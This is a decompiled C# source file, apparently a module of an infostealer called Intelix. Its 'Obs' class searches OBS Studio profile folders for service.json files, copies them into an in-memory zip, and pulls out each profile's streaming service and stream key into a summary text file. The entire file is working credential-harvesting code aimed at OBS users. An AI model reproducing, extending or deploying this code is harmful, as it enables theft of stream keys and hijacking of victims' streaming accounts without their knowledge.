using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200004C RID: 76
	public class Obs : ITarget
	{
		// Token: 0x060000F7 RID: 247 RVA: 0x0000E5F0 File Offset: 0x0000C7F0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "obs-studio", "basic", "profiles");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				string[] jsonFiles = new string[]
				{
					"service.json",
					"service.json.bak"
				};
				ConcurrentBag<string> infoLines = new ConcurrentBag<string>();
				string[] directories = Directory.GetDirectories(path);
				bool flag2 = directories.Length == 0;
				if (!flag2)
				{
					Counter.CounterApplications counterApplications = new Counter.CounterApplications();
					counterApplications.Name = "OBS";
					Parallel.ForEach<string>(directories, delegate(string profileDir)
					{
						string text2 = Path.GetFileName(profileDir) ?? profileDir;
						foreach (string text3 in jsonFiles)
						{
							string text4 = Path.Combine(profileDir, text3);
							bool flag5 = File.Exists(text4);
							if (flag5)
							{
								string text5 = File.ReadAllText(text4, Encoding.UTF8);
								string text6 = "OBS\\" + text2 + "\\" + text3;
								zip.AddFile(text6, File.ReadAllBytes(text4));
								counterApplications.Files.Add(text4 + " => " + text6);
								Match match = Obs.SettingsRe.Match(text5);
								string input = match.Success ? match.Groups["s"].Value : text5;
								string value = Obs.ServiceRe.Match(input).Groups["v"].Value;
								string value2 = Obs.KeyRe.Match(input).Groups["v"].Value;
								bool flag6 = !string.IsNullOrEmpty(value) || !string.IsNullOrEmpty(value2);
								if (flag6)
								{
									infoLines.Add(string.Concat(new string[]
									{
										"Profile:",
										text2,
										" | File:",
										text3,
										" | Service:",
										value,
										" | Key:",
										value2
									}));
								}
							}
						}
					});
					bool flag3 = infoLines.Any<string>();
					if (flag3)
					{
						string text = "OBS\\OBS_ServiceKeys.txt";
						zip.AddTextFile(text, string.Join(Environment.NewLine, infoLines));
						counterApplications.Files.Add(text);
					}
					bool flag4 = counterApplications.Files.Count > 0;
					if (flag4)
					{
						counter.Applications.Add(counterApplications);
					}
				}
			}
		}

		// Token: 0x04000017 RID: 23
		private static readonly Regex SettingsRe = new Regex("\"settings\"\\s*:\\s*\\{(?<s>.*?)\\}", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);

		// Token: 0x04000018 RID: 24
		private static readonly Regex ServiceRe = new Regex("\"service\"\\s*:\\s*\"(?<v>[^\"]*)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);

		// Token: 0x04000019 RID: 25
		private static readonly Regex KeyRe = new Regex("\"key\"\\s*:\\s*\"(?<v>[^\"]*)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline);
	}
}
